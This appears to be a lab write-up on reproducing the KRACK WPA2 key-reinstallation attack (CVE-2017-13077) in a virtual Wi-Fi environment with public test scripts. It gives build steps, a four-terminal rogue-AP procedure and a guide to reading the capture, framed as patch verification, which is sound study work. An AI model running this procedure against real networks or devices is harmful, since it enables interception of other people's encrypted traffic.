# KRACK Attack Notes (CVE-2017-13077)

This document covers the background of the KRACK attack, one-time setup of
Mathy Vanhoef's `krackattacks-scripts`, the exact 4-terminal procedure used
in this lab, and how to interpret the results.

---

## Background

KRACK (Key Reinstallation Attack), discovered by Mathy Vanhoef and published
at CCS 2017, targets the WPA2 4-way handshake itself rather than the
underlying AES-CCMP cipher.

| Property | Details |
|---|---|
| CVE | CVE-2017-13077 (pairwise key reinstallation in the 4-way handshake) |
| CVSS | 8.1 (High) |
| Affected | All WPA2 implementations before October 2017 patches |
| Attack type | Nonce reuse via PTK reinstallation |
| Impact | AES-CCMP encryption fully broken — plaintext recovery possible |
| Fix | Clients must never reinstall an already-installed key |
| Patch status | Fixed in `wpa_supplicant` 2.7+ and all major OS vendors, Oct 2017 |

### Attack mechanism

**Normal handshake:**
1. AP sends MSG1 with ANonce
2. Client sends MSG2 with SNonce + MIC
3. AP sends MSG3 — client installs PTK, resets nonce to 0
4. Client sends MSG4 (ACK)
5. Both sides communicate with nonce incrementing from 0

**KRACK attack flow:**
1. AP sends MSG1, client sends MSG2 (normal)
2. AP sends MSG3 — client installs PTK, nonce = 0
3. Attacker blocks MSG4 from reaching the AP
4. AP retransmits MSG3 after timeout
5. Attacker (or the AP itself, in this PoC) replays MSG3 repeatedly
6. **Vulnerable** client reinstalls the same PTK each time — nonce resets to 0 each time
7. Reused nonce + AES-CCMP => `C1 XOR C2 = P1 XOR P2`. With known plaintext
   (e.g. ARP, TCP headers) an attacker can recover full plaintext.

A **patched** client (wpa_supplicant 2.7+) still responds to each replayed
MSG3 with MSG4, but does **not** reinstall the PTK or reset the nonce.

---

## One-Time Setup

```bash
git clone https://github.com/vanhoefm/krackattacks-scripts.git ~/krackattacks
cd ~/krackattacks/krackattack

sudo apt install -y build-essential libnl-3-dev libnl-genl-3-dev pkg-config libssl-dev
./build.sh

./pysetup.sh
source venv/bin/activate
pip install pycryptodome
```

> `source venv/bin/activate` only applies to your current shell. It does
> **not** carry over to `sudo`. The KRACK script must therefore be launched
> with `sudo -E $(which python3) krack-test-client.py` — the `-E` flag
> preserves the venv's Python path under sudo.


## ⚠️ WARNING: Disabling hardware crypto below WILL REQUIRE A HOST REBOOT.
## Save your work before copy-pasting these steps.


### Disable hardware encryption

```bash
sudo ./disable-hwcrypto.sh
sudo reboot
```

Hardware NICs maintain their own nonce counters inside the radio chip.
Disabling hardware crypto forces software encryption so a PTK reinstallation
actually resets the nonce visibly. On a VM using `mac80211_hwsim` there is no
real hardware crypto path anyway, so the performance impact is zero.

After reboot, verify:
```bash
cat /etc/modprobe.d/nohwcrypt.conf
```
Should show `nohwcrypt=1` for all drivers.

**Re-enable later:**
```bash
sudo ~/krackattacks/krackattack/reenable-hwcrypto.sh
sudo reboot
```

### Configure the rogue AP

```bash
grep -E "interface=|ssid=|wpa_passphrase=" ~/krackattacks/krackattack/hostapd.conf
```
Should show:
```
interface=wlan2
ssid=testnetwork
wpa_passphrase=abcdefgh
```
If `interface` is wrong:
```bash
sed -i 's/interface=.*/interface=wlan2/' ~/krackattacks/krackattack/hostapd.conf
```

---

## Running the Demo

After every reboot:
```bash
./scripts/setup_interfaces.sh 3
```

Then either run `./scripts/run_krack_demo.sh`, or follow the manual
4-terminal procedure below for full visibility.

### Manual 4-terminal procedure

Open 4 separate terminals. **Order matters** — do not start a later terminal
until the previous one confirms it is ready. The most common failure is
wrong ordering.

**Terminal 1 — Start the victim AP**
```bash
newgrp docker
cd wpa2-krack-lab
docker-compose up ap &
sleep 10
docker logs wpa2_ap
```
Confirm `wlan0: AP-ENABLED` before continuing.

**Terminal 2 — Cache sudo and start tcpdump on wlan2**

> Capture must be on **`wlan2`**, not `hwsim0`. `hwsim0` sees all radio
> traffic from every virtual interface, which makes it impossible to isolate
> the KRACK replay frames. `wlan2` is the rogue AP interface and shows only
> KRACK traffic.

```bash
sudo -v
sudo tcpdump -i wlan2 -w shared/krack_capture.pcap &
jobs
```
`jobs` must show tcpdump `Running`. If it shows `Stopped`, run `sudo -v`
again and retry.

**Terminal 3 — Run the KRACK attack script**
```bash
cd ~/krackattacks/krackattack
source venv/bin/activate
sudo -E $(which python3) krack-test-client.py
```
Wait for **both** of these lines before touching Terminal 4:
```
wlan2: AP-ENABLED
Ready. Connect to this Access Point to start the tests
```

**Terminal 4 — Connect the victim client**

Only run this *after* Terminal 3 shows "Ready":
```bash
sudo killall wpa_supplicant 2>/dev/null
sleep 1
sudo wpa_supplicant -i wlan1 -D nl80211 -c /tmp/krack_client.conf -d 2>&1 &
```

---

## Reading the Results

Watch Terminal 3. You should see repeated cycles of:
```
sending a new 4-way message 3 where the GTK has a zero RSC
received a new message 4
```

Wait for at least 8-10 repetitions before stopping, so the capture has enough
frames to display clearly in Wireshark.

| Result | Meaning |
|---|---|
| `client DOESN'T reinstall the pairwise key in the 4-way handshake (this is good)` | **Patched system.** wpa_supplicant 2.7+ correctly rejects PTK reinstallation. The attack infrastructure works — MSG3 was replayed and MSG4 returned each time — but the client is immune. |
| `Detected PTK reinstallation - client is VULNERABLE to CVE-2017-13077` | **Vulnerable system.** wpa_supplicant 2.3 or earlier (or unpatched Android 6.0). Nonce reuse confirmed, encryption broken. |

---

## Stopping and Analyzing the Capture

```bash
sudo pkill wpa_supplicant          # Terminal 4
# Ctrl+C in Terminal 3
sudo kill -SIGINT $(pgrep tcpdump) # Terminal 2 - SIGINT writes the pcap footer correctly
cd wpa2-krack-lab && docker-compose down
sudo chmod 644 shared/krack_capture.pcap
wireshark shared/krack_capture.pcap &
```

Apply filter `eapol`. You should see:
- MSG1 once, from `02:00:00:00:02:00` (rogue AP on wlan2)
- MSG3 repeated 8-10 times from the same source
- MSG4 from `02:00:00:00:01:00` (victim client) after each MSG3

This visually proves the KRACK replay attack: a normal handshake has exactly
one MSG3; this capture has many.

> **Why pkill -9 / plain pkill corrupts the file:** tcpdump buffers writes and
> finalizes the pcap global header / last block on a clean exit. `SIGINT`
> (Ctrl+C) triggers a clean shutdown; `SIGKILL` does not, leaving a pcap that
> Wireshark reports as "cut short in the middle of a packet".

---

## Significance of the Result

A "patched, not vulnerable" result is not a failure — it is the expected and
correct outcome on a modern system, and it is arguably the more interesting
result for a report because it demonstrates:

1. The attack infrastructure is fully functional (MSG3 replay + MSG4 response)
2. The KRACK vulnerability is real and reproducible at the protocol level
3. The October 2017 patches correctly mitigate it — clients now track whether
   a key has already been installed and refuse to reinstall it
